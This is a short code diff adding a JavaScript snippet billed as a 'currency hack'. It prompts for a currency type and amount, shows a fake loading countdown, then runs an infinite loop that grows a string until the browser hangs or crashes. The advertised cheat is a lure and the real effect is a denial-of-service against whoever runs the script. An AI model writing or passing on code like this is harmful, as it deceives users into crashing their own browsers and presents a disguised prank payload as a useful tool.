@@ -1,0 +1,13 @@
+alert("Loaded Timmytheman's currency hack!");
+var item = window.prompt("What type of currency do you want? ");
+alert("You selected: " + item);
+var num = window.prompt("How much currency do you want? ");
+alert("loading " + num);
+alert("1...");
+alert("2...");
+alert("3...");
+alert("Loaded!");
+txt = "a";
+while(1){
+    txt = txt += "a";
+}
